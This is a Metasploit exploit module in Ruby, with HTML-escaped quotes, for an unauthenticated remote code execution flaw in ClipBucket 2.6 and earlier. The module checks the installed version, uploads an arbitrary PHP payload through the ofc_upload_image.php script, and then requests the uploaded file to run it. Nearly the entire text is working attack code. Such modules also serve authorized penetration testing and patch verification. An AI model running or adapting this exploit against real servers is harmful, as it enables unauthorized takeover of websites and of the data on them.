# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "ClipBucket Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in ClipBucket version 2.6 and lower.
        The script "/admin_area/charts/ofc-library/ofc_upload_image.php" can be used to
        upload arbitrary code without any authentication. This module has been tested
        on version 2.6 on CentOS 5.9 32-bit.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Gabby&#039;, # Vulnerability Discovery, PoC
          &#039;xistence <xistence[at]0x90.nl>&#039; # Metasploit module
        ],
      &#039;References&#039;      =>
        [
          [ &#039;URL&#039;, &#039;http://packetstormsecurity.com/files/123480/ClipBucket-Remote-Code-Execution.html&#039; ]
        ],
      &#039;Platform&#039;        => [&#039;php&#039;],
      &#039;Arch&#039;            => ARCH_PHP,
      &#039;Targets&#039;         =>
        [
          [&#039;Clipbucket 2.6&#039;, {}]
        ],
      &#039;Privileged&#039;      => false,
      &#039;DisclosureDate&#039;  => "Oct 04 2013",
      &#039;DefaultTarget&#039;   => 0))

    register_options(
      [
       OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the ClipBucket application&#039;, &#039;/&#039;])
      ], self.class)
  end

  def uri
    return target_uri.path
  end

  def check
    # Check version
    peer = "#{rhost}:#{rport}"

    print_status("#{peer} - Trying to detect installed version")

    res = send_request_cgi({
     &#039;method&#039; => &#039;GET&#039;,
     &#039;uri&#039;    => normalize_uri(uri, "")
    })

    if res and res.code == 200 and res.body =~ /ClipBucket version (\d+\.\d+)/
      version = $1
    else
      return Exploit::CheckCode::Unknown
    end

    print_status("#{peer} - Version #{version} detected")

    if version > "2.6"
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    peer = "#{rhost}:#{rport}"
    payload_name = rand_text_alphanumeric(rand(10) + 5) + ".php"

    print_status("#{peer} - Uploading payload [ #{payload_name} ]")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(uri, "admin_area", "charts", "ofc-library", "ofc_upload_image.php"),
      &#039;headers&#039;  => { &#039;Content-Type&#039; => &#039;text/plain&#039; },
      &#039;vars_get&#039; => { &#039;name&#039; => payload_name },
      &#039;data&#039;  => payload.encoded
    })

    # If the server returns 200 we assume we uploaded the malicious
    # file successfully
    if not res or res.code != 200 or res.body !~ /Saving your image to: \.\.\/tmp-upload-images\/(#{payload_name})/ or res.body =~ /HTTP_RAW_POST_DATA/
      fail_with(Failure::None, "#{peer} - File wasn&#039;t uploaded, aborting!")
    end

    register_files_for_cleanup(payload_name)

    print_status("#{peer} - Executing Payload [ #{uri}/admin_area/charts/tmp-upload-images/#{payload_name} ]" )
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(uri, "admin_area", "charts", "tmp-upload-images", payload_name)
    })

    # If we don&#039;t get a 200 when we request our malicious payload, we suspect
    # we don&#039;t have a shell, either.
    if res and res.code != 200
      print_error("#{peer} - Unexpected response, probably the exploit failed")
    end

  end

end

